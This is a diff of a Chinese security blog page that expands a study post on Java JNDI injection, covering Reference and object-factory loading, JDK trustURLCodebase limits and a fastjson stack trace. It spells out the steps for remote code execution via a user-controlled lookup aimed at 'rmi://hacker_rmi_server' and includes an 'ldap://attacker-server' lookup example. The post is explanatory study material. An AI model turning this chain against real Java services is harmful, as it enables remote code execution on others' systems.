@@ -106,11 +106,14 @@
 <meta property="og:url" content="https://virusday.github.io/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="v1rus blog">
 <meta property="og:description" content="0x01 前言​    续上篇RMI的内容，接着来学习JNDI的相关知识。JNDI注入也是fastjson反序列漏洞的攻击方法之一。 0x02 JNDI简介​    I代表Interface，是一种接口，是一种统一的API。服务器端叫做服务供应接口（SPI），管理者将JNDI API映射为特定的命名服务和目录系统，实现交互。类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所">
+<meta property="og:image" content="https://virusday.github.io/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/4.png">
+<meta property="og:image" content="https://virusday.github.io/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/2.png">
 <meta property="article:published_time" content="2020-11-30T07:17:27.879Z">
-<meta property="article:modified_time" content="2020-12-02T07:28:59.079Z">
+<meta property="article:modified_time" content="2021-02-18T07:22:20.710Z">
 <meta property="article:author" content="Virusday">
 <meta property="article:tag" content="Learn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://virusday.github.io/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/4.png">
 
 
 
@@ -333,8 +336,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-12-02T15:28:59+08:00">
-                2020-12-02
+              <time title="更新于" itemprop="dateModified" datetime="2021-02-18T15:22:20+08:00">
+                2021-02-18
               </time>
             
           </span>
@@ -361,7 +364,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.4k
+                  2.4k
                 </span>
               
 
@@ -377,7 +380,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6
+                  9
                 </span>
               
             </div>
@@ -399,13 +402,38 @@
 
       
         <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    续上篇RMI的内容，接着来学习JNDI的相关知识。JNDI注入也是fastjson反序列漏洞的攻击方法之一。</p>
-<h2 id="0x02-JNDI简介"><a href="#0x02-JNDI简介" class="headerlink" title="0x02 JNDI简介"></a>0x02 JNDI简介</h2><p>​    I代表Interface，是一种接口，是一种统一的API。服务器端叫做服务供应接口（SPI），管理者将JNDI API映射为特定的命名服务和目录系统，实现交互。类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。    </p>
+<h2 id="0x02-JNDI简介"><a href="#0x02-JNDI简介" class="headerlink" title="0x02 JNDI简介"></a>0x02 JNDI简介</h2><p>​    I代表Interface，是一种接口，是一种统一的API。服务器端叫做服务供应接口（SPI），管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录系统</strong>，实现交互。类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。<br>​    使用它可以与不同的Naming Service和Directory Service进行交互。比如RMI,LDAP,Active Directory,DNS,CORBA。其中Naming Service是对象和名称绑定在一起，然后通过名称去查找相应的对象。而Directory Service是一种特殊的Naming Service，它允许储存和查找Directory对象，Directory对象和一般的对象不同在于它可以将属性和对象相关联。</p>
 <p>​    简单理解：服务器端将这个索引库的接口实现，通过指定的名称找到对应的对象。动态加载数据库配置文件来解耦合。</p>
+<h3 id="0、-好处"><a href="#0、-好处" class="headerlink" title="0、 好处"></a>0、 好处</h3><p>①、 jndi自身并<strong>不区分</strong>客户端和服务器端，也不具备远程能力，但是<strong>被其协同</strong>的一些其他应用一般都具备远程能力，然后在这个其他应用上再去区分客户端和服务器端。客户端主要是各种访问、查询、搜索，服务器端主要是进行帮助管理配置（bind）。虽然rmi服务器上可以不直接使用Register.bind()，虽然底层还是这么是实现的，但是表面是jndi统一管理，所以第一个好处就是<strong>统一地配置接口</strong>。</p>
+<p>②、类似的url形式来访问目标服务 ，也就是<strong>jndi动态协议转换</strong>。</p>
+<p>③、在下图的jndi分层结构中，对SPI层和Naming Manager层，JVM在验证从何处加载远程类时的行为时不同。也就是说，JVM对于远程加载类有两种不同的安全级别，分别时SPI级别和Naming Manager级别。SPI级别中如果JVM允许从远程加载类，需要根据不同的服务提供者（RMI、LDAP、CORBA）来决定是否强制安装Security Manager安全管理器。具体条件：</p>
+<p><img src="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/4.png" alt></p>
+<p>但是Naming Manager层放宽了安全限制。解码JNDI命名引用时，始终允许从外部代码库加载类，没有JMVM选项禁用它。所以并不需要强制安装任何安全管理器，这样攻击者可以利用特定的情况来远程执行自己的代码。</p>
 <h3 id="1、JNDI结构"><a href="#1、JNDI结构" class="headerlink" title="1、JNDI结构"></a>1、JNDI结构</h3><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>
 
 <h3 id="2、-RMI中动态加载字节码"><a href="#2、-RMI中动态加载字节码" class="headerlink" title="2、 RMI中动态加载字节码"></a>2、 RMI中动态加载字节码</h3><p>​    如果远程获取 <code>RMI</code> 服务上的对象为 <code>Reference</code> 类或者其子类，则在客户端获取到远程对象<strong>存根实例（STUB）</strong>时，可以从其他服务器上加载 <code>class</code> 文件来进行实例化。</p>
-<h3 id="3、Reference类"><a href="#3、Reference类" class="headerlink" title="3、Reference类"></a>3、Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统<strong>外部找到的对象的引用</strong>。提供了JNDI中类的引用功能。</p>
+<h3 id="3、JNDI命名引用-Reference类"><a href="#3、JNDI命名引用-Reference类" class="headerlink" title="3、JNDI命名引用-Reference类"></a>3、JNDI命名引用-Reference类</h3><p>​    为了在命名服务或目录服务中绑定Java对象，可以使用Java序列化来传输对象，但有时候不太合适，比如Java对象较大的情况。因此JNDI定义了命名引用(Naming References)，后面直接简称引用(References)。通过<strong>绑定一个引用</strong>，将<strong>对象</strong>存储到<strong>命名服务或目录服务</strong>中，命名管理器(Naming Manager)可以将<strong>引用解析为关联的原始对象</strong>。</p>
+<p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统<strong>外部找到的对象的引用</strong>。提供了JNDI中类的引用功能。</p>
+<p>引用一张官方的架构图</p>
+<p><img src="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
+<h4 id="JNDI和Object-Factory之间的关系"><a href="#JNDI和Object-Factory之间的关系" class="headerlink" title="JNDI和Object Factory之间的关系"></a>JNDI和Object Factory之间的关系</h4><p>​    jndi触发payload的过程：lookup方法中调用了decodeObject方法，又进入到NamingManager.getObjectInstance方法（Naming Manager属于jndi第二层结构）</p>
+<p><strong>关键：</strong>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+<p>整个利用流程如下：</p>
+<ol>
+<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
+</ol>
+<p>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
+<p>另外，要注意的是，针对JNDI注入，后续的JDK版本，对于RMI/LDAP两个攻击向量而言，也做了默认情况的限制：</p>
+<ul>
+<li><em>com.sun.jndi.ldap.object.trustURLCodebase</em> 属性在 Oracle JDK 11.0.1, 8u191, 7u201, and 6u211及以后的版本，默认值为false，即不允许LDAP从远程地址加载Reference工厂类。</li>
+<li><em>com.sun.jndi.rmi.object.trustURLCodebase</em> 属性在 Oracle JDK 8u113, 7u122, 6u132及以后的版本，默认值为false，即默认不允许RMI从远程地址加载Reference工厂类。</li>
+</ul>
+<p><strong>坑点：</strong>也是自己调了非常久的bug，发现网上怎么也找不到答案，后来发现是自己构造的类有问题，虽然看起来在代码层面一样，当时这个.java文件一定不能加package xxx.xxx，不然就会抛出classnotdefexception，就离谱</p>
 <h4 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">	为类名为“className”的对象构造一个新的引用。  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">	为类名为“className”的对象和地址构造一个新引用。  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">	为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">	为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。</span><br></pre></td></tr></table></figure>
 
 <p>代码：</p>
@@ -419,7 +447,19 @@
 
 <p>​    这里定义一个 <code>Reference</code> 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 <code>RMI</code> 进行远程访问：</p>
 <p>​    当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://127.0.0.1:12345/refClassName.class</code> 动态加载 <code>classes</code> 并调用 <code>insClassName</code> 的构造函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">web_1 | at com.sun.rowset.JdbcRowSetImpl.connect(JdbcRowSetImpl.java:634) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(JdbcRowSetImpl.java:4067) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_102]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:96) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_JdbcRowSetImpl.deserialze(Unknown Source) ~[na:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.DefaultJSONParser.parseExtra(DefaultJSONParser.java:1490) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:766) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User.deserialze(Unknown Source) ~[na:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.JSON.parseObject(JSON.java:339) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.JSON.parseObject(JSON.java:307) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.JSON.parseObject(JSON.java:270) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.JSON.parseObject(JSON.java:370) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.JSON.parseObject(JSON.java:452) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br><span class="line">web_1 | at com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter.read(FastJsonHttpMessageConverter.java:190) ~[fastjson-1.2.24.jar!&#x2F;:na]</span><br></pre></td></tr></table></figure>
+<h3 id="4、-JNDI动态协议转换"><a href="#4、-JNDI动态协议转换" class="headerlink" title="4、 JNDI动态协议转换"></a>4、 JNDI动态协议转换</h3><p>即使服务端提前设置了工厂与<em>PROVIDER_URL</em>也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换，并覆盖掉事先设置的<em>PROVIDER_URL，</em>将lookup操作指向攻击者控制的服务器。</p>
+<p>举个栗子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        <span class="string">"rmi://localhost:9999"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">String name = <span class="string">"ldap://attacker-server/cn=bar,dc=test,dc=org"</span>;</span><br><span class="line"><span class="comment">//通过名称查找对象</span></span><br><span class="line">ctx.lookup(name);</span><br></pre></td></tr></table></figure>
+
+<p>来看看lookup方法的代码，进入lookup方法，会调用getURLOrDefaultInitCtx方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在getURLOrDefaultInitCtx方法中进行动态转换。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br><span class="line">    String scheme = getURLScheme(name);</span><br><span class="line">    <span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Context ctx = NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">        <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ctx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>利用JNDI注入去攻击RMI、LDAP等命名服务和目录服务，比直接在SPI层面去攻击RMI、LDAP要容易得多，比如在上一篇文章[Java RMI]中提到的：与SPI相比，JNDI没有Java SecurityManager的限制，另外JDK版本的限制也更加宽松。</p>
+<p><a href="https://medium.com/@m01e/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5-ab5134574323" target="_blank" rel="noopener">https://medium.com/@m01e/java%E5%AE%89%E5%85%A8-jndi%E6%B3%A8%E5%85%A5-ab5134574323</a></p>
+
       
     </div>
     
@@ -536,7 +576,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -580,23 +620,23 @@
                 
                 
                   <li class="recent_posts_li">
+                    <a href="/2021/02/18/fastjson%E7%B3%BB%E5%88%97/1.2.24/1/" title="fastjson系列/1.2.24/1" target="_blank">fastjson系列/1.2.24/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/02/13/gadget%E9%93%BE%E5%AD%A6%E4%B9%A0/Commons%20Collections/1/" title="gadget链学习/Commons Collections/1" target="_blank">gadget链学习/Commons Collections/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2021/02/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/1/" title="任意文件读取/1" target="_blank">任意文件读取/1</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
                     <a href="/2021/01/29/Orancle%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1/" title="Orancle注入总结/1" target="_blank">Orancle注入总结/1</a>
                   </li>
                 
                   <li class="recent_posts_li">
                     <a href="/2021/01/28/mimikatz/%E5%A4%9A%E9%87%8D%E5%88%A9%E7%94%A8/" title="mimikatz/多重利用" target="_blank">mimikatz/多重利用</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/01/20/linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/" title="linux反弹shell总结/linux反弹shell总结" target="_blank">linux反弹shell总结/linux反弹shell总结</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/01/19/hta%E5%85%8D%E6%9D%80/hta%E6%B5%85%E6%9E%90/" title="hta免杀/hta浅析" target="_blank">hta免杀/hta浅析</a>
-                  </li>
-                
-                  <li class="recent_posts_li">
-                    <a href="/2021/01/18/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8Fgetshell%E6%80%BB%E7%BB%93/1/" title="网站渗透getshell总结/1" target="_blank">网站渗透getshell总结/1</a>
                   </li>
                 
               </ul>
@@ -624,7 +664,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-JNDI简介"><span class="nav-number">2.</span> <span class="nav-text">0x02 JNDI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、JNDI结构"><span class="nav-number">2.1.</span> <span class="nav-text">1、JNDI结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-RMI中动态加载字节码"><span class="nav-number">2.2.</span> <span class="nav-text">2、 RMI中动态加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、Reference类"><span class="nav-number">2.3.</span> <span class="nav-text">3、Reference类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#构造方法："><span class="nav-number">2.3.1.</span> <span class="nav-text">构造方法：</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-JNDI简介"><span class="nav-number">2.</span> <span class="nav-text">0x02 JNDI简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0、-好处"><span class="nav-number">2.1.</span> <span class="nav-text">0、 好处</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1、JNDI结构"><span class="nav-number">2.2.</span> <span class="nav-text">1、JNDI结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-RMI中动态加载字节码"><span class="nav-number">2.3.</span> <span class="nav-text">2、 RMI中动态加载字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、JNDI命名引用-Reference类"><span class="nav-number">2.4.</span> <span class="nav-text">3、JNDI命名引用-Reference类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JNDI和Object-Factory之间的关系"><span class="nav-number">2.4.1.</span> <span class="nav-text">JNDI和Object Factory之间的关系</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造方法："><span class="nav-number">2.4.2.</span> <span class="nav-text">构造方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、-JNDI动态协议转换"><span class="nav-number">2.5.</span> <span class="nav-text">4、 JNDI动态协议转换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03总结"><span class="nav-number">3.</span> <span class="nav-text">0x03总结</span></a></li></ol></div>
             
 
           </div>
@@ -666,7 +706,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">67.8k</span>
+    <span title="Site words total count">75.5k</span>
   
 </div>
 -->
